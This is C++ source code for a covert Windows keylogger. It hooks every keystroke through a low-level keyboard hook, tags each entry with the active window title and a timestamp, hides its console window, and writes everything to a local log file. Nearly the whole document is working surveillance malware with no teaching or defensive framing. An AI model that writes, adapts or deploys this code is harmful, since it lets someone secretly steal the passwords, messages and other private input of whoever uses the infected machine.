#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ctime>
#include <map>

using namespace std;

#define invisible       // (visible / invisible)
#define bootwait      // (bootwait / nowait)
#define FORMAT 0      // 0 = text labels, 10 = decimal codes, 16 = hex codes
#define mouseignore   // Ignore mouse clicks
#define _CRT_SECURE_NO_WARNINGS

#if FORMAT == 0
const map<int, string> keyLabels{
    {VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"}, {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"}, {VK_SHIFT, "[SHIFT]"}, {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"}, {VK_CONTROL, "[CONTROL]"}, {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"}, {VK_MENU, "[ALT]"}, {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"}, {VK_ESCAPE, "[ESCAPE]"}, {VK_END, "[END]"},
    {VK_HOME, "[HOME]"}, {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"}, {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}, {VK_OEM_PERIOD, "."}, {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"}, {VK_OEM_MINUS, "-"}, {VK_ADD, "+"},
    {VK_SUBTRACT, "-"}, {VK_CAPITAL, "[CAPSLOCK]"}
};
#endif

HHOOK g_hook;
KBDLLHOOKSTRUCT g_kbdStruct;
ofstream g_outputFile;

// Function Prototypes
void InstallKeyboardHook();
void RemoveKeyboardHook();
int LogKeystroke(int key);
void SetConsoleVisibility();
bool IsSystemStillBooting();

// Hook callback function
LRESULT __stdcall KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        g_kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        LogKeystroke(g_kbdStruct.vkCode);
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void InstallKeyboardHook() {
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, nullptr, 0);
    if (!g_hook) {
        MessageBox(nullptr, L"Failed to install hook!", L"Error", MB_ICONERROR);
    }
}

void RemoveKeyboardHook() {
    UnhookWindowsHookEx(g_hook);
}

int LogKeystroke(int key) {
    static char lastWindow[256] = "";
    stringstream output;
#ifndef mouseignore
    if (key == 1 || key == 2) return 0;
#endif

    HWND activeWindow = GetForegroundWindow();
    DWORD threadId;
    HKL keyboardLayout = nullptr;

    if (activeWindow) {
        threadId = GetWindowThreadProcessId(activeWindow, nullptr);
        keyboardLayout = GetKeyboardLayout(threadId);

        char windowTitle[256];
        GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));

        if (strcmp(windowTitle, lastWindow) != 0) {
            strcpy(lastWindow, windowTitle);

            // Get current time
            time_t t = time(nullptr);
            struct tm timeInfo;
            struct tm* timeInfoPtr = localtime(&t);
            if (timeInfoPtr) {
                timeInfo = *timeInfoPtr;
            }


            char timeStr[64];
            strftime(timeStr, sizeof(timeStr), "%FT%X%z", &timeInfo);

            output << "\n\n[Window: " << windowTitle << " - at " << timeStr << "] ";
        }
    }

#if FORMAT == 10
    output << '[' << key << ']';
#elif FORMAT == 16
    output << hex << "[" << key << ']';
#else
    if (keyLabels.find(key) != keyLabels.end()) {
        output << keyLabels.at(key);
    } else {
        char ch = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);
        bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
        if (!isLowercase) ch = tolower(ch);

        output << ch;
    }
#endif

    g_outputFile << output.str();
    g_outputFile.flush();

    // cout << output.str();
    return 0;
}

void SetConsoleVisibility() {
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
#endif
#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
    FreeConsole();
#endif
}

bool IsSystemStillBooting() {
    // SM_SYSTEMDOCKED is a poor flag; replace with something else or always return false.
    return false;
}

int main() {
    SetConsoleVisibility();

#ifdef bootwait
    while (IsSystemStillBooting()) {
        // cout << "System is still booting up. Waiting 10 seconds...\n";
        Sleep(10000);
    }
#endif

    const char* outputFilename = "keylogger.log";
    // cout << "Logging output to " << outputFilename << endl;
    g_outputFile.open(outputFilename, ios_base::app);

    InstallKeyboardHook();

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {}
}
